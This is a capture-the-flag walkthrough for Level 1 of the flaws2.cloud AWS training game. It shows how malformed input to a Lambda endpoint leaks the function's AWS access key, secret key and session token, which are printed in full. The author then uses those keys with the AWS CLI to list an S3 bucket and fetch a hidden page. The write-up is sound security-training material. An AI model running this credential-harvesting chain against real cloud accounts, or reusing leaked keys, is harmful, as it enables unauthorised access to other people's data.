# flaws2.cloud
+ http://flaws2.cloud/

<center>
<pre>
      _  _       _  _                 _           _             _      _  _  _  _         _  _  _
    _(_)(_)     (_)(_)              _(_)_        (_)           (_)   _(_)(_)(_)(_)_    _ (_)(_)(_) _
 _ (_) _           (_)            _(_) (_)_      (_)           (_)  (_)          (_)  (_)         (_)
(_)(_)(_)          (_)          _(_)     (_)_    (_)     _     (_)  (_)_  _  _  _               _ (_)
   (_)             (_)         (_) _  _  _ (_)   (_)   _(_)_   (_)    (_)(_)(_)(_)_          _ (_)
   (_)             (_)         (_)(_)(_)(_)(_)   (_)  (_) (_)  (_)   _           (_)      _ (_)
   (_)           _ (_) _       (_)         (_)   (_)_(_)   (_)_(_)  (_)_  _  _  _(_)   _ (_) _  _  _
   (_)          (_)(_)(_)      (_)         (_)     (_)       (_)      (_)(_)(_)(_)    (_)(_)(_)(_)(_)
</pre>
</center>

## Solutions
- [Level 1](https://github.com/h4md153v63n/CloudSec/blob/main/07_flAWS/02_flaws2.cloud.md#level-1)
- [Level 2](https://github.com/h4md153v63n/CloudSec/blob/main/07_flAWS/02_flaws2.cloud.md#level-2)


### Level 1
Visit: http://level1.flaws2.cloud/

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $nslookup level1.flaws2.cloud
Server:		192.168.1.1
Address:	192.168.1.1#53

Non-authoritative answer:
Name:	level1.flaws2.cloud
Address: 16.182.74.117
Name:	level1.flaws2.cloud
Address: 52.217.226.109
Name:	level1.flaws2.cloud
Address: 52.217.228.5
Name:	level1.flaws2.cloud
Address: 52.216.214.53
Name:	level1.flaws2.cloud
Address: 3.5.8.121
Name:	level1.flaws2.cloud
Address: 52.217.164.197
Name:	level1.flaws2.cloud
Address: 16.182.71.165
Name:	level1.flaws2.cloud
Address: 54.231.161.53
** server can't find level1.flaws2.cloud: NOTIMP

┌─[✗]─[cwl@RedCloud]─[~/Desktop]
└──╼ $nslookup 16.182.74.117
117.74.182.16.in-addr.arpa	name = s3-website-us-east-1.amazonaws.com.

Authoritative answers can be found from:
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/fa777b9d-fd78-4653-a62d-9792b6c9011f)

**AWS S3 Bucket:** s3-website-us-east-1.amazonaws.com

Navigate S3 URL: http://flaws2.cloud.s3-website-us-east-1.amazonaws.com/

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/8508a9c9-43d7-4491-804a-f7af5e21090b)

Visit: https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=%27 and **Raw Data**.

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/34833710-4da1-4d5d-9a3f-203cd96671bf)

AWS Keys Discovered using beautifying with https://jsonformatter.org/:
```
Error, malformed input
{
  "AWS_LAMBDA_LOG_STREAM_NAME": "2024/06/05/[$LATEST]fbe04cb6ec6f4cea8b130ac8aac1c59c",
  "LAMBDA_TASK_ROOT": "/var/task",
  "AWS_XRAY_DAEMON_ADDRESS": "169.254.79.129:2000",
  "AWS_EXECUTION_ENV": "AWS_Lambda_nodejs8.10",
  "AWS_DEFAULT_REGION": "us-east-1",
  "_AWS_XRAY_DAEMON_PORT": "2000",
  "AWS_REGION": "us-east-1",
  "_HANDLER": "index.handler",
  "LAMBDA_RUNTIME_DIR": "/var/runtime",
  "AWS_SESSION_TOKEN": "IQoJb3JpZ2luX2VjEDwaCXVzLWVhc3QtMSJHMEUCIQDtf48CnbD4QlyDtaBJYrfvSed8RQEto9ZxzDJMawgY9gIgc27rF+1OTtr/pf0adPwa/fvEGPQoSUhawRmg/rEeb+wq6QIIxP//////////ARADGgw2NTM3MTEzMzE3ODgiDOcV6OhhnIDXIMq4Uiq9Aii/VDUJO2Mg7c91WOlITZ/jA0bdurFE2BW05SL2ULvOOaC5ZwJHy74cqcVtjLOTnfXFc6/p43doDs0yDRVeKXTl8ZLGwXgROEc9vNnyk59FcQneEeY+Drh7934QtWi89uB9X8Elz7g9iqCY2V93/9mbX0wFIsjrFuF/PHL2T1VhbtRQbDCKLifxg9M9k47ahUq0GJtVe3BnqO2AfAvXALK8mfsvR99Yr4TnbsERs7LbqSd+mHQdLE81qT8UNlsIldIkO2WYvb1kBcjomfweKRK6AVyO3qftiduNL3CLo5E4L9Ej0isT6rsUEe+0vbw01W+tt3J1W+kZfqM/H2MCODtU+/sOBrAZDia68Kx6dhsIbkyav/jooP2GrNQZR1Z/alqdnPzUUrPO1nAMknntG6uwoQz4yqPy0jd5d5PEML/xgrMGOp4BGG1k+wUhKqVQr1THTm5rMIp3/i+wcfZFgP03eCKZNmJS4z9EjgxUVc60522sVF4OpeMjDe3vZSE+jeYzWYl4/Xl5Oq0ICjsxxZObNbVYZT34Ua2pwsqpng5CDBkjgO8MXr2qtwnP4a2mexFxqVmo9E3KJz0uPR29qKDkpLbSOsCeUl5gtCQVicu+HfmxAGH+cCOw1jxJjWMs3DZVe3E =",
  "PATH": "/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin",
  "_AWS_XRAY_DAEMON_ADDRESS": "169.254.79.129",
  "AWS_ACCESS_KEY_ID": "ASIAZQNB3KHGC7JL3FO G",
  "AWS_LAMBDA_LOG_GROUP_NAME": "/aws/lambda/level1",
  "TZ": ":UTC",
  "LD_LIBRARY_PATH": "/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib",
  "AWS_LAMBDA_INITIALIZATION_TYPE": "on-demand",
  "AWS_XRAY_CONTEXT_MISSING": "LOG_ERROR",
  "AWS_SECRET_ACCESS_KEY": "t/GEkmglD1d8CfAhQs8/UCkW/XmkBIsf4QvWCIe I",
  "AWS_LAMBDA_FUNCTION_VERSION": "$LATEST",
  "AWS_LAMBDA_FUNCTION_NAME": "level1",
  "AWS_LAMBDA_FUNCTION_MEMORY_SIZE": "128",
  "AWS_LAMBDA_RUNTIME_API": "127.0.0.1:9001",
  "LANG": "en_US.UTF-8",
  "NODE_PATH": "/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules",
  "_X_AMZN_TRACE_ID": "Root=1-6660b9d9-352f609f409edda6385102fc;Parent=5d92efd13d33ef36;Sampled=0;Lineage=e547cb94:0"
}
```

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $nano ~/.aws/credentials
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $tail -n 4 ~/.aws/credentials
[level1]
AWS_ACCESS_KEY_ID=ASIAZQNB3KHGC7JL3FO G
AWS_SECRET_ACCESS_KEY=t/GEkmglD1d8CfAhQs8/UCkW/XmkBIsf4QvWCIe I
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEDwaCXVzLWVhc3QtMSJHMEUCIQDtf48CnbD4QlyDtaBJYrfvSed8RQEto9ZxzDJMawgY9gIgc27rF+1OTtr/pf0adPwa/fvEGPQoSUhawRmg/rEeb+wq6QIIxP//////////ARADGgw2NTM3MTEzMzE3ODgiDOcV6OhhnIDXIMq4Uiq9Aii/VDUJO2Mg7c91WOlITZ/jA0bdurFE2BW05SL2ULvOOaC5ZwJHy74cqcVtjLOTnfXFc6/p43doDs0yDRVeKXTl8ZLGwXgROEc9vNnyk59FcQneEeY+Drh7934QtWi89uB9X8Elz7g9iqCY2V93/9mbX0wFIsjrFuF/PHL2T1VhbtRQbDCKLifxg9M9k47ahUq0GJtVe3BnqO2AfAvXALK8mfsvR99Yr4TnbsERs7LbqSd+mHQdLE81qT8UNlsIldIkO2WYvb1kBcjomfweKRK6AVyO3qftiduNL3CLo5E4L9Ej0isT6rsUEe+0vbw01W+tt3J1W+kZfqM/H2MCODtU+/sOBrAZDia68Kx6dhsIbkyav/jooP2GrNQZR1Z/alqdnPzUUrPO1nAMknntG6uwoQz4yqPy0jd5d5PEML/xgrMGOp4BGG1k+wUhKqVQr1THTm5rMIp3/i+wcfZFgP03eCKZNmJS4z9EjgxUVc60522sVF4OpeMjDe3vZSE+jeYzWYl4/Xl5Oq0ICjsxxZObNbVYZT34Ua2pwsqpng5CDBkjgO8MXr2qtwnP4a2mexFxqVmo9E3KJz0uPR29qKDkpLbSOsCeUl5gtCQVicu+HfmxAGH+cCOw1jxJjWMs3DZVe3E =
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws sts get-caller-identity --profile level1
{
    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
}
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/e1a517cb-c9ad-497c-b616-4b5794482f82)

```
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 ls s3://level1.flaws2.cloud --profile level1
                           PRE img/
2018-11-21 02:25:05      17102 favicon.ico
2018-11-21 07:30:22       1905 hint1.htm
2018-11-21 07:30:22       2226 hint2.htm
2018-11-21 07:30:22       2536 hint3.htm
2018-11-21 07:30:23       2460 hint4.htm
2018-11-21 07:30:17       3000 index.htm
2018-11-21 07:30:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
┌─[cwl@RedCloud]─[~/Desktop]
└──╼ $aws s3 cp s3://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html - --profile level1
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
    <meta name="description" content="AWS Security training">
    <meta name="keywords" content="aws,security,ctf,amazon,enterprise,defense,infosec,cyber,flaws2">
    <title>flAWS2.cloud</title>
    
    <link href="http://flaws2.cloud/css/bootstrap.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
    <link href="http://flaws2.cloud/css/summitroute.css" rel="stylesheet">

    <link rel="icon" href="/favicon.ico" sizes="16x16 32x32 64x64" type="image/vnd.microsoft.icon">
</head>

<body>
    <div class="stretchforfooter">
        <div class="container">
            <nav class="navbar navbar-default" role="navigation">
                <div class="navbar-header">
                    <a class="navbar-brand" href="/"></a>
                </div>
                <div>
                    <ul class="nav navbar-nav navbar-right">
                        <li>
                            <a href="http://flaws2.cloud" class="hvr-overline-from-center">flaws2.cloud</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </div>

        <hr class="gradient">

        <div class="content-section-a">
          <div class="container">
    <div class="row">
        <div class="col-sm-8 col-sm-offset-2">

<div class="content">
    <div class="row">
        <div class="col-sm-12">
            <center><h1>Level 1 - Secret</h1></center>
            <hr>
            The next level is at <a href="http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud">http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud</a>
            
        </div>
    </div>
</div>

</body>
</html>
```

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/1bee43c1-7d50-4819-97e0-e12ebb70ad63)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/a346c5c6-2a4e-4cf1-8493-94859287f49a)

The next level: http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud


### Level 2
Visit: http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud







